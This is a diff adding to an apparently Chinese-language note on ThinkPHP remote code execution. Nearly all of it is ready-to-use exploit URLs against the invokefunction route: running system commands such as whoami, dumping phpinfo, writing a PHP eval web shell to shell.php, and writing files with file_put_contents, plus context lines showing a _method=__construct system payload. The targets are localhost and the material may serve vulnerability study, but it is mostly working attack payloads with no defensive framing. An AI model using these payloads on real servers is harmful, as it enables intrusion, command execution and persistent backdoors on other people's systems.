@@ -32,3 +32,19 @@ POST /?s=xxx HTTP/1.1
 _method=__construct&filter[]=system&method=get&get[]=ls+-al
 _method=__construct&filter[]=system&method=get&server[REQUEST_METHOD]=ls
 ```
+### 1. 利用 system 函数远程命令执行
+```PHP
+http://localhost:9096/public/index.php?s=index/think\app/invokefunction&function=call_user_func_array&vars[0]=system&vars[1][]=whoami
+```
+### 2.通过 phpinfo 函数写出 phpinfo () 的信息
+```PHP
+http://localhost:9096/public/index.php?s=index/\think\app/invokefunction&function=call_user_func_array&vars[0]=phpinfo&vars[1][]=1
+```
+### 3. 写入 shell:
+```PHP
+http://localhost:9096/public/index.php?s=/index/\think\app/invokefunction&function=call_user_func_array&vars[0]=system&vars[1][]=echo%20^%3C?php%20@eval($_GET[%22code%22])?^%3E%3Eshell.php
+```
+### 或者
+```PHP
+http://localhost:9096/index.php?s=index/think\app/invokefunction&function=call_user_func_array&vars[0]=file_put_contents&vars[1][]=../test.php&vars[1][]=<?php echo 'ok';?>
+```
